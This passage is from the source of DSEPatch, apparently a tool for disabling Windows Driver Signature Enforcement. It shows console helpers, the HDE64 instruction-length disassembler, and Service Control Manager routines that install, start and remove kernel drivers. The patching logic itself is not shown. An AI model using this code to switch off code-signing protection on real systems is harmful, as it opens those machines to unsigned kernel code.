	consoleIO = consoleIO * sizeof(WCHAR) + 4 + sizeof(UNICODE_NULL);
	Buffer = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, consoleIO);
	if (Buffer) {

		_strcpy(Buffer, lpText);
		if (UseReturn) _strcat_w(Buffer, TEXT("\r\n"));

		consoleIO = _strlen_w(Buffer);

		if (g_ConsoleOutput != FALSE) {
			WriteConsoleW(g_ConOut, Buffer, (DWORD)consoleIO, &bytesIO, NULL);
		}
		else {
			WriteFile(g_ConOut, Buffer, (DWORD)(consoleIO * sizeof(WCHAR)), &bytesIO, NULL);
		}
		HeapFree(GetProcessHeap(), 0, Buffer);
	}
}

/*
* cuiPrintTextLastErrorA
*
* Purpose:
*
* Output LastError translated code to the console or file.
* ANSI version.
*
*/
VOID cuiPrintTextLastErrorA(
    _In_ BOOL UseReturn
    )
{
    CHAR szTextBuffer[512];
    DWORD dwLastError = GetLastError();
    
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, dwLastError, LANG_USER_DEFAULT, (LPSTR)&szTextBuffer, 512, NULL);
    cuiPrintTextA(szTextBuffer, UseReturn);
}

/*
* cuiPrintTextLastErrorW
*
* Purpose:
*
* Output LastError translated code to the console or file.
* UNICODE version.
*
*/
VOID cuiPrintTextLastErrorW(
    _In_ BOOL UseReturn
)
{
    WCHAR szTextBuffer[512];
    DWORD dwLastError = GetLastError();

    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, NULL, dwLastError, LANG_USER_DEFAULT, (LPWSTR)&szTextBuffer, 512, NULL);
    cuiPrintTextW(szTextBuffer, UseReturn);
}

```

`source/DSEPatch/DSEPatch/cui/cui.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2018
*
*  TITLE:       CUI.H
*
*  VERSION:     1.30
*
*  DATE:        01 Aug 2018
*
*  Common header file for console ui.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

VOID cuiInitialize(
    _In_ BOOL InitInput,
    _Out_opt_ PBOOL IsConsoleOutput
    );

#ifdef _UNICODE
#define cuiPrintText cuiPrintTextW
#define cuiPrintTextLastError cuiPrintTextLastErrorW
#else
#define cuiPrintText cuiPrintTextA
#define cuiPrintTextLastError cuiPrintTextLastErrorA
#endif


VOID cuiPrintTextA(
    _In_ LPSTR lpText,
    _In_ BOOL UseReturn
    );

VOID cuiPrintTextW(
	_In_ LPWSTR lpText,
	_In_ BOOL UseReturn
	);

VOID cuiPrintTextLastErrorA(
    _In_ BOOL UseReturn
    );

VOID cuiPrintTextLastErrorW(
    _In_ BOOL UseReturn
    );

VOID cuiClrScr(
    VOID
    );

```

`source/DSEPatch/DSEPatch/global.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2019
*
*  TITLE:       GLOBAL.H
*
*  VERSION:     1.05
*
*  DATE:        22 Jan 2019
*
*  Common header file for the program support routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

#if !defined UNICODE
#error ANSI build is not supported
#endif

#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union


#if defined (_MSC_VER)
#if (_MSC_VER >= 1900)
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libucrt.lib")
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif
#endif

#include <Windows.h>
#include <ntstatus.h>
#include "vbox.h"
#include "ntdll/ntos.h"
#include "minirtl/minirtl.h"
#include "minirtl/cmdline.h"
#include "hde/hde64.h"
#include "cui/cui.h"
#include "sup.h"
#include "instdrv.h"

```

`source/DSEPatch/DSEPatch/hde/hde64.c`:

```c
/*
 * Hacker Disassembler Engine 64 C
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 */

#include "hde64.h"
#include "table64.h"

#pragma warning(push)
#pragma warning(disable:4701)
#pragma warning(disable:4706)

unsigned int hde64_disasm(const void *code, hde64s *hs)
{
    uint8_t x, c = 0, *p = (uint8_t *)code, cflags, opcode, pref = 0;
    uint8_t *ht = hde64_table, m_mod, m_reg, m_rm, disp_size = 0;
    uint8_t op64 = 0;

    // Avoid using memset to reduce the footprint.
#ifndef _MSC_VER
    memset((LPBYTE)hs, 0, sizeof(hde64s));
#else
    __stosb((LPBYTE)hs, 0, sizeof(hde64s));
#endif

    for (x = 16; x; x--)
        switch (c = *p++) {
            case 0xf3:
                hs->p_rep = c;
                pref |= PRE_F3;
                break;
            case 0xf2:
                hs->p_rep = c;
                pref |= PRE_F2;
                break;
            case 0xf0:
                hs->p_lock = c;
                pref |= PRE_LOCK;
                break;
            case 0x26: case 0x2e: case 0x36:
            case 0x3e: case 0x64: case 0x65:
                hs->p_seg = c;
                pref |= PRE_SEG;
                break;
            case 0x66:
                hs->p_66 = c;
                pref |= PRE_66;
                break;
            case 0x67:
                hs->p_67 = c;
                pref |= PRE_67;
                break;
            default:
                goto pref_done;
        }
  pref_done:

    hs->flags = (uint32_t)pref << 23;

    if (!pref)
        pref |= PRE_NONE;

    if ((c & 0xf0) == 0x40) {
        hs->flags |= F_PREFIX_REX;
        if ((hs->rex_w = (c & 0xf) >> 3) && (*p & 0xf8) == 0xb8)
            op64++;
        hs->rex_r = (c & 7) >> 2;
        hs->rex_x = (c & 3) >> 1;
        hs->rex_b = c & 1;
        if (((c = *p++) & 0xf0) == 0x40) {
            opcode = c;
            goto error_opcode;
        }
    }

    if ((hs->opcode = c) == 0x0f) {
        hs->opcode2 = c = *p++;
        ht += DELTA_OPCODES;
    } else if (c >= 0xa0 && c <= 0xa3) {
        op64++;
        if (pref & PRE_67)
            pref |= PRE_66;
        else
            pref &= ~PRE_66;
    }

    opcode = c;
    cflags = ht[ht[opcode / 4] + (opcode % 4)];

    if (cflags == C_ERROR) {
      error_opcode:
        hs->flags |= F_ERROR | F_ERROR_OPCODE;
        cflags = 0;
        if ((opcode & -3) == 0x24)
            cflags++;
    }

    x = 0;
    if (cflags & C_GROUP) {
        uint16_t t;
        t = *(uint16_t *)(ht + (cflags & 0x7f));
        cflags = (uint8_t)t;
        x = (uint8_t)(t >> 8);
    }

    if (hs->opcode2) {
        ht = hde64_table + DELTA_PREFIXES;
        if (ht[ht[opcode / 4] + (opcode % 4)] & pref)
            hs->flags |= F_ERROR | F_ERROR_OPCODE;
    }

    if (cflags & C_MODRM) {
        hs->flags |= F_MODRM;
        hs->modrm = c = *p++;
        hs->modrm_mod = m_mod = c >> 6;
        hs->modrm_rm = m_rm = c & 7;
        hs->modrm_reg = m_reg = (c & 0x3f) >> 3;

        if (x && ((x << m_reg) & 0x80))
            hs->flags |= F_ERROR | F_ERROR_OPCODE;

        if (!hs->opcode2 && opcode >= 0xd9 && opcode <= 0xdf) {
            uint8_t t = opcode - 0xd9;
            if (m_mod == 3) {
                ht = hde64_table + DELTA_FPU_MODRM + t*8;
                t = ht[m_reg] << m_rm;
            } else {
                ht = hde64_table + DELTA_FPU_REG;
                t = ht[t] << m_reg;
            }
            if (t & 0x80)
                hs->flags |= F_ERROR | F_ERROR_OPCODE;
        }

        if (pref & PRE_LOCK) {
            if (m_mod == 3) {
                hs->flags |= F_ERROR | F_ERROR_LOCK;
            } else {
                uint8_t *table_end, op = opcode;
                if (hs->opcode2) {
                    ht = hde64_table + DELTA_OP2_LOCK_OK;
                    table_end = ht + DELTA_OP_ONLY_MEM - DELTA_OP2_LOCK_OK;
                } else {
                    ht = hde64_table + DELTA_OP_LOCK_OK;
                    table_end = ht + DELTA_OP2_LOCK_OK - DELTA_OP_LOCK_OK;
                    op &= -2;
                }
                for (; ht != table_end; ht++)
                    if (*ht++ == op) {
                        if (!((*ht << m_reg) & 0x80))
                            goto no_lock_error;
                        else
                            break;
                    }
                hs->flags |= F_ERROR | F_ERROR_LOCK;
              no_lock_error:
                ;
            }
        }

        if (hs->opcode2) {
            switch (opcode) {
                case 0x20: case 0x22:
                    m_mod = 3;
                    if (m_reg > 4 || m_reg == 1)
                        goto error_operand;
                    else
                        goto no_error_operand;
                case 0x21: case 0x23:
                    m_mod = 3;
                    if (m_reg == 4 || m_reg == 5)
                        goto error_operand;
                    else
                        goto no_error_operand;
            }
        } else {
            switch (opcode) {
                case 0x8c:
                    if (m_reg > 5)
                        goto error_operand;
                    else
                        goto no_error_operand;
                case 0x8e:
                    if (m_reg == 1 || m_reg > 5)
                        goto error_operand;
                    else
                        goto no_error_operand;
            }
        }

        if (m_mod == 3) {
            uint8_t *table_end;
            if (hs->opcode2) {
                ht = hde64_table + DELTA_OP2_ONLY_MEM;
                table_end = ht + sizeof(hde64_table) - DELTA_OP2_ONLY_MEM;
            } else {
                ht = hde64_table + DELTA_OP_ONLY_MEM;
                table_end = ht + DELTA_OP2_ONLY_MEM - DELTA_OP_ONLY_MEM;
            }
            for (; ht != table_end; ht += 2)
                if (*ht++ == opcode) {
                    if (*ht++ & pref && !((*ht << m_reg) & 0x80))
                        goto error_operand;
                    else
                        break;
                }
            goto no_error_operand;
        } else if (hs->opcode2) {
            switch (opcode) {
                case 0x50: case 0xd7: case 0xf7:
                    if (pref & (PRE_NONE | PRE_66))
                        goto error_operand;
                    break;
                case 0xd6:
                    if (pref & (PRE_F2 | PRE_F3))
                        goto error_operand;
                    break;
                case 0xc5:
                    goto error_operand;
            }
            goto no_error_operand;
        } else
            goto no_error_operand;

      error_operand:
        hs->flags |= F_ERROR | F_ERROR_OPERAND;
      no_error_operand:

        c = *p++;
        if (m_reg <= 1) {
            if (opcode == 0xf6)
                cflags |= C_IMM8;
            else if (opcode == 0xf7)
                cflags |= C_IMM_P66;
        }

        switch (m_mod) {
            case 0:
                if (pref & PRE_67) {
                    if (m_rm == 6)
                        disp_size = 2;
                } else
                    if (m_rm == 5)
                        disp_size = 4;
                break;
            case 1:
                disp_size = 1;
                break;
            case 2:
                disp_size = 2;
                if (!(pref & PRE_67))
                    disp_size <<= 1;
        }

        if (m_mod != 3 && m_rm == 4) {
            hs->flags |= F_SIB;
            p++;
            hs->sib = c;
            hs->sib_scale = c >> 6;
            hs->sib_index = (c & 0x3f) >> 3;
            if ((hs->sib_base = c & 7) == 5 && !(m_mod & 1))
                disp_size = 4;
        }

        p--;
        switch (disp_size) {
            case 1:
                hs->flags |= F_DISP8;
                hs->disp.disp8 = *p;
                break;
            case 2:
                hs->flags |= F_DISP16;
                hs->disp.disp16 = *(uint16_t *)p;
                break;
            case 4:
                hs->flags |= F_DISP32;
                hs->disp.disp32 = *(uint32_t *)p;
        }
        p += disp_size;
    } else if (pref & PRE_LOCK)
        hs->flags |= F_ERROR | F_ERROR_LOCK;

    if (cflags & C_IMM_P66) {
        if (cflags & C_REL32) {
            if (pref & PRE_66) {
                hs->flags |= F_IMM16 | F_RELATIVE;
                hs->imm.imm16 = *(uint16_t *)p;
                p += 2;
                goto disasm_done;
            }
            goto rel32_ok;
        }
        if (op64) {
            hs->flags |= F_IMM64;
            hs->imm.imm64 = *(uint64_t *)p;
            p += 8;
        } else if (!(pref & PRE_66)) {
            hs->flags |= F_IMM32;
            hs->imm.imm32 = *(uint32_t *)p;
            p += 4;
        } else
            goto imm16_ok;
    }


    if (cflags & C_IMM16) {
      imm16_ok:
        hs->flags |= F_IMM16;
        hs->imm.imm16 = *(uint16_t *)p;
        p += 2;
    }
    if (cflags & C_IMM8) {
        hs->flags |= F_IMM8;
        hs->imm.imm8 = *p++;
    }

    if (cflags & C_REL32) {
      rel32_ok:
        hs->flags |= F_IMM32 | F_RELATIVE;
        hs->imm.imm32 = *(uint32_t *)p;
        p += 4;
    } else if (cflags & C_REL8) {
        hs->flags |= F_IMM8 | F_RELATIVE;
        hs->imm.imm8 = *p++;
    }

  disasm_done:

    if ((hs->len = (uint8_t)(p-(uint8_t *)code)) > 15) {
        hs->flags |= F_ERROR | F_ERROR_LENGTH;
        hs->len = 15;
    }

    return (unsigned int)hs->len;
}
#pragma warning(pop)

```

`source/DSEPatch/DSEPatch/hde/hde64.h`:

```h
/*
 * Hacker Disassembler Engine 64
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 * hde64.h: C/C++ header file
 *
 */

#ifndef _HDE64_H_
#define _HDE64_H_

/* stdint.h - C99 standard header
 * http://en.wikipedia.org/wiki/stdint.h
 *
 * if your compiler doesn't contain "stdint.h" header (for
 * example, Microsoft Visual C++), you can download file:
 *   http://www.azillionmonkeys.com/qed/pstdint.h
 * and change next line to:
 *   #include "pstdint.h"
 */
#include "pstdint.h"

#define F_MODRM         0x00000001
#define F_SIB           0x00000002
#define F_IMM8          0x00000004
#define F_IMM16         0x00000008
#define F_IMM32         0x00000010
#define F_IMM64         0x00000020
#define F_DISP8         0x00000040
#define F_DISP16        0x00000080
#define F_DISP32        0x00000100
#define F_RELATIVE      0x00000200
#define F_ERROR         0x00001000
#define F_ERROR_OPCODE  0x00002000
#define F_ERROR_LENGTH  0x00004000
#define F_ERROR_LOCK    0x00008000
#define F_ERROR_OPERAND 0x00010000
#define F_PREFIX_REPNZ  0x01000000
#define F_PREFIX_REPX   0x02000000
#define F_PREFIX_REP    0x03000000
#define F_PREFIX_66     0x04000000
#define F_PREFIX_67     0x08000000
#define F_PREFIX_LOCK   0x10000000
#define F_PREFIX_SEG    0x20000000
#define F_PREFIX_REX    0x40000000
#define F_PREFIX_ANY    0x7f000000

#define PREFIX_SEGMENT_CS   0x2e
#define PREFIX_SEGMENT_SS   0x36
#define PREFIX_SEGMENT_DS   0x3e
#define PREFIX_SEGMENT_ES   0x26
#define PREFIX_SEGMENT_FS   0x64
#define PREFIX_SEGMENT_GS   0x65
#define PREFIX_LOCK         0xf0
#define PREFIX_REPNZ        0xf2
#define PREFIX_REPX         0xf3
#define PREFIX_OPERAND_SIZE 0x66
#define PREFIX_ADDRESS_SIZE 0x67

#pragma pack(push,1)

typedef struct {
    uint8_t len;
    uint8_t p_rep;
    uint8_t p_lock;
    uint8_t p_seg;
    uint8_t p_66;
    uint8_t p_67;
    uint8_t rex;
    uint8_t rex_w;
    uint8_t rex_r;
    uint8_t rex_x;
    uint8_t rex_b;
    uint8_t opcode;
    uint8_t opcode2;
    uint8_t modrm;
    uint8_t modrm_mod;
    uint8_t modrm_reg;
    uint8_t modrm_rm;
    uint8_t sib;
    uint8_t sib_scale;
    uint8_t sib_index;
    uint8_t sib_base;
    union {
        uint8_t imm8;
        uint16_t imm16;
        uint32_t imm32;
        uint64_t imm64;
    } imm;
    union {
        uint8_t disp8;
        uint16_t disp16;
        uint32_t disp32;
    } disp;
    uint32_t flags;
} hde64s;

#pragma pack(pop)

#ifdef __cplusplus
extern "C" {
#endif

/* __cdecl */
unsigned int hde64_disasm(const void *code, hde64s *hs);

#ifdef __cplusplus
}
#endif

#endif /* _HDE64_H_ */

```

`source/DSEPatch/DSEPatch/hde/pstdint.h`:

```h
/*
 *  MinHook - The Minimalistic API Hooking Library for x64/x86
 *  Copyright (C) 2009-2015 Tsuda Kageyu. All rights reserved.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *
 *  THIS SOFTWARE IS PROVIDED BY THE AUTHOR "AS IS" AND ANY EXPRESS OR
 *  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 *  OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 *  IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 *  INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 *  NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 *  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 *  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 *  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 *  THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#pragma once

#include <windows.h>

// Integer types for HDE.
typedef INT8   int8_t;
typedef INT16  int16_t;
typedef INT32  int32_t;
typedef INT64  int64_t;
typedef UINT8  uint8_t;
typedef UINT16 uint16_t;
typedef UINT32 uint32_t;
typedef UINT64 uint64_t;

```

`source/DSEPatch/DSEPatch/hde/table64.h`:

```h
/*
 * Hacker Disassembler Engine 64 C
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 */

#define C_NONE    0x00
#define C_MODRM   0x01
#define C_IMM8    0x02
#define C_IMM16   0x04
#define C_IMM_P66 0x10
#define C_REL8    0x20
#define C_REL32   0x40
#define C_GROUP   0x80
#define C_ERROR   0xff

#define PRE_ANY  0x00
#define PRE_NONE 0x01
#define PRE_F2   0x02
#define PRE_F3   0x04
#define PRE_66   0x08
#define PRE_67   0x10
#define PRE_LOCK 0x20
#define PRE_SEG  0x40
#define PRE_ALL  0xff

#define DELTA_OPCODES      0x4a
#define DELTA_FPU_REG      0xfd
#define DELTA_FPU_MODRM    0x104
#define DELTA_PREFIXES     0x13c
#define DELTA_OP_LOCK_OK   0x1ae
#define DELTA_OP2_LOCK_OK  0x1c6
#define DELTA_OP_ONLY_MEM  0x1d8
#define DELTA_OP2_ONLY_MEM 0x1e7

unsigned char hde64_table[] = {
  0xa5,0xaa,0xa5,0xb8,0xa5,0xaa,0xa5,0xaa,0xa5,0xb8,0xa5,0xb8,0xa5,0xb8,0xa5,
  0xb8,0xc0,0xc0,0xc0,0xc0,0xc0,0xc0,0xc0,0xc0,0xac,0xc0,0xcc,0xc0,0xa1,0xa1,
  0xa1,0xa1,0xb1,0xa5,0xa5,0xa6,0xc0,0xc0,0xd7,0xda,0xe0,0xc0,0xe4,0xc0,0xea,
  0xea,0xe0,0xe0,0x98,0xc8,0xee,0xf1,0xa5,0xd3,0xa5,0xa5,0xa1,0xea,0x9e,0xc0,
  0xc0,0xc2,0xc0,0xe6,0x03,0x7f,0x11,0x7f,0x01,0x7f,0x01,0x3f,0x01,0x01,0xab,
  0x8b,0x90,0x64,0x5b,0x5b,0x5b,0x5b,0x5b,0x92,0x5b,0x5b,0x76,0x90,0x92,0x92,
  0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x6a,0x73,0x90,
  0x5b,0x52,0x52,0x52,0x52,0x5b,0x5b,0x5b,0x5b,0x77,0x7c,0x77,0x85,0x5b,0x5b,
  0x70,0x5b,0x7a,0xaf,0x76,0x76,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,
  0x5b,0x5b,0x86,0x01,0x03,0x01,0x04,0x03,0xd5,0x03,0xd5,0x03,0xcc,0x01,0xbc,
  0x03,0xf0,0x03,0x03,0x04,0x00,0x50,0x50,0x50,0x50,0xff,0x20,0x20,0x20,0x20,
  0x01,0x01,0x01,0x01,0xc4,0x02,0x10,0xff,0xff,0xff,0x01,0x00,0x03,0x11,0xff,
  0x03,0xc4,0xc6,0xc8,0x02,0x10,0x00,0xff,0xcc,0x01,0x01,0x01,0x00,0x00,0x00,
  0x00,0x01,0x01,0x03,0x01,0xff,0xff,0xc0,0xc2,0x10,0x11,0x02,0x03,0x01,0x01,
  0x01,0xff,0xff,0xff,0x00,0x00,0x00,0xff,0x00,0x00,0xff,0xff,0xff,0xff,0x10,
  0x10,0x10,0x10,0x02,0x10,0x00,0x00,0xc6,0xc8,0x02,0x02,0x02,0x02,0x06,0x00,
  0x04,0x00,0x02,0xff,0x00,0xc0,0xc2,0x01,0x01,0x03,0x03,0x03,0xca,0x40,0x00,
  0x0a,0x00,0x04,0x00,0x00,0x00,0x00,0x7f,0x00,0x33,0x01,0x00,0x00,0x00,0x00,
  0x00,0x00,0xff,0xbf,0xff,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0xff,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,
  0x00,0x00,0x00,0xbf,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x7f,0x00,0x00,
  0xff,0x40,0x40,0x40,0x40,0x41,0x49,0x40,0x40,0x40,0x40,0x4c,0x42,0x40,0x40,
  0x40,0x40,0x40,0x40,0x40,0x40,0x4f,0x44,0x53,0x40,0x40,0x40,0x44,0x57,0x43,
  0x5c,0x40,0x60,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,
  0x40,0x40,0x64,0x66,0x6e,0x6b,0x40,0x40,0x6a,0x46,0x40,0x40,0x44,0x46,0x40,
  0x40,0x5b,0x44,0x40,0x40,0x00,0x00,0x00,0x00,0x06,0x06,0x06,0x06,0x01,0x06,
  0x06,0x02,0x06,0x06,0x00,0x06,0x00,0x0a,0x0a,0x00,0x00,0x00,0x02,0x07,0x07,
  0x06,0x02,0x0d,0x06,0x06,0x06,0x0e,0x05,0x05,0x02,0x02,0x00,0x00,0x04,0x04,
  0x04,0x04,0x05,0x06,0x06,0x06,0x00,0x00,0x00,0x0e,0x00,0x00,0x08,0x00,0x10,
  0x00,0x18,0x00,0x20,0x00,0x28,0x00,0x30,0x00,0x80,0x01,0x82,0x01,0x86,0x00,
  0xf6,0xcf,0xfe,0x3f,0xab,0x00,0xb0,0x00,0xb1,0x00,0xb3,0x00,0xba,0xf8,0xbb,
  0x00,0xc0,0x00,0xc1,0x00,0xc7,0xbf,0x62,0xff,0x00,0x8d,0xff,0x00,0xc4,0xff,
  0x00,0xc5,0xff,0x00,0xff,0xff,0xeb,0x01,0xff,0x0e,0x12,0x08,0x00,0x13,0x09,
  0x00,0x16,0x08,0x00,0x17,0x09,0x00,0x2b,0x09,0x00,0xae,0xff,0x07,0xb2,0xff,
  0x00,0xb4,0xff,0x00,0xb5,0xff,0x00,0xc3,0x01,0x00,0xc7,0xff,0xbf,0xe7,0x08,
  0x00,0xf0,0x02,0x00
};

```

`source/DSEPatch/DSEPatch/instdrv.c`:

```c
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2017, portions (C) Mark Russinovich, FileMon
*
*  TITLE:       INSTDRV.C
*
*  VERSION:     1.10
*
*  DATE:        17 Apr 2017
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* scmInstallDriver
*
* Purpose:
*
* Create SCM service entry describing kernel driver.
*
*/
BOOL scmInstallDriver(
    _In_ SC_HANDLE SchSCManager,
    _In_ LPCTSTR DriverName,
    _In_opt_ LPCTSTR ServiceExe
)
{
    SC_HANDLE  schService;

    schService = CreateService(SchSCManager, // SCManager database
        DriverName,           // name of service
        DriverName,           // name to display
        SERVICE_ALL_ACCESS,    // desired access
        SERVICE_KERNEL_DRIVER, // service type
        SERVICE_DEMAND_START,  // start type
        SERVICE_ERROR_NORMAL,  // error control type
        ServiceExe,            // service's binary
        NULL,                  // no load ordering group
        NULL,                  // no tag identifier
        NULL,                  // no dependencies
        NULL,                  // LocalSystem account
        NULL                   // no password
    );
    if (schService == NULL) {
        return FALSE;
    }

    CloseServiceHandle(schService);
    return TRUE;
}

/*
* scmStartDriver
*
* Purpose:
*
* Start service, resulting in SCM drvier load.
*
*/
BOOL scmStartDriver(
    _In_ SC_HANDLE SchSCManager,
    _In_ LPCTSTR DriverName
)
{
    SC_HANDLE  schService;
    BOOL       ret;

    schService = OpenService(SchSCManager,
        DriverName,
        SERVICE_ALL_ACCESS
    );
    if (schService == NULL)
        return FALSE;

    ret = StartService(schService, 0, NULL)
        || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;

    CloseServiceHandle(schService);

    return ret;
}

/*
* scmOpenDevice
*
* Purpose:
*
* Open driver device by symbolic link.
*
*/
BOOL scmOpenDevice(
    _In_ LPCTSTR DriverName,
    _Inout_opt_ PHANDLE lphDevice
)
{
    TCHAR    completeDeviceName[64];
    HANDLE   hDevice;

    RtlSecureZeroMemory(completeDeviceName, sizeof(completeDeviceName));
    wsprintf(completeDeviceName, TEXT("\\\\.\\%s"), DriverName);

    hDevice = CreateFile(completeDeviceName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hDevice == INVALID_HANDLE_VALUE)
        return FALSE;

    if (lphDevice) {
        *lphDevice = hDevice;
    }
    else {
        CloseHandle(hDevice);
    }

    return TRUE;
}

/*
* scmStopDriver
*
* Purpose:
*
* Command SCM to stop service, resulting in driver unload.
*
*/
BOOL scmStopDriver(
    _In_ SC_HANDLE SchSCManager,
    _In_ LPCTSTR DriverName
)
{
    BOOL            ret;
    INT             iRetryCount;
    SC_HANDLE       schService;
    SERVICE_STATUS  serviceStatus;

    ret = FALSE;
    schService = OpenService(SchSCManager, DriverName, SERVICE_ALL_ACCESS);
    if (schService == NULL) {
        return ret;
    }

    iRetryCount = 5;
    do {
        SetLastError(0);

        ret = ControlService(schService, SERVICE_CONTROL_STOP, &serviceStatus);
        if (ret != FALSE)
            break;

        if (GetLastError() != ERROR_DEPENDENT_SERVICES_RUNNING)
            break;

        Sleep(1000);
        iRetryCount--;
    } while (iRetryCount);

    CloseServiceHandle(schService);

    return ret;
}

/*
* scmRemoveDriver
*
* Purpose:
*
* Remove service entry from SCM database.
*
*/
BOOL scmRemoveDriver(
    _In_ SC_HANDLE SchSCManager,
    _In_ LPCTSTR DriverName
)
{
    SC_HANDLE  schService;
    BOOL       bResult = FALSE;

    schService = OpenService(SchSCManager, DriverName, SERVICE_ALL_ACCESS);
    if (schService) {
        bResult = DeleteService(schService);
        CloseServiceHandle(schService);
    }
    return bResult;
}

/*
* scmUnloadDeviceDriver
*
* Purpose:
*
* Combines scmStopDriver and scmRemoveDriver.
*
*/
BOOL scmUnloadDeviceDriver(
    _In_ LPCTSTR Name
)
{
    SC_HANDLE schSCManager;
    BOOL      bResult = FALSE;

    if (Name == NULL) {
        return bResult;
    }

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager) {
        scmStopDriver(schSCManager, Name);
        bResult = scmRemoveDriver(schSCManager, Name);
        CloseServiceHandle(schSCManager);
    }
    return bResult;
}

/*
* scmLoadDeviceDriver
*
* Purpose:
*
* Unload if already exists, Create, Load and Open driver instance.
*
*/
BOOL scmLoadDeviceDriver(
    _In_		LPCTSTR Name,
    _In_opt_	LPCTSTR Path,
    _Inout_		PHANDLE lphDevice
)
{
    SC_HANDLE schSCManager;
    BOOL      bResult = FALSE;

    if (Name == NULL) {
        return bResult;
    }

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager) {
        scmRemoveDriver(schSCManager, Name);
        scmInstallDriver(schSCManager, Name, Path);
        scmStartDriver(schSCManager, Name);
        bResult = scmOpenDevice(Name, lphDevice);
        CloseServiceHandle(schSCManager);
    }
    return bResult;
}

```

`source/DSEPatch/DSEPatch/instdrv.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2017, portions (C) Mark Russinovich, FileMon
*
*  TITLE:       INSTDRV.H
*
*  VERSION:     1.10
*
*  DATE:        17 Apr 2017
*
*  Common header file for the program SCM usage.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

BOOL scmInstallDriver(
    _In_ SC_HANDLE SchSCManager,
    _In_ LPCTSTR DriverName,
    _In_opt_ LPCTSTR ServiceExe
);

BOOL scmStartDriver(
    _In_ SC_HANDLE SchSCManager,
    _In_ LPCTSTR DriverName
);

BOOL scmOpenDevice(
    _In_ LPCTSTR DriverName,
    _Inout_opt_ PHANDLE lphDevice
);

BOOL scmStopDriver(
    _In_ SC_HANDLE SchSCManager,
    _In_ LPCTSTR DriverName
);

BOOL scmRemoveDriver(
    _In_ SC_HANDLE SchSCManager,
    _In_ LPCTSTR DriverName
);

BOOL scmUnloadDeviceDriver(
    _In_ LPCTSTR Name
);

BOOL scmLoadDeviceDriver(
    _In_		LPCTSTR Name,
    _In_opt_	LPCTSTR Path,
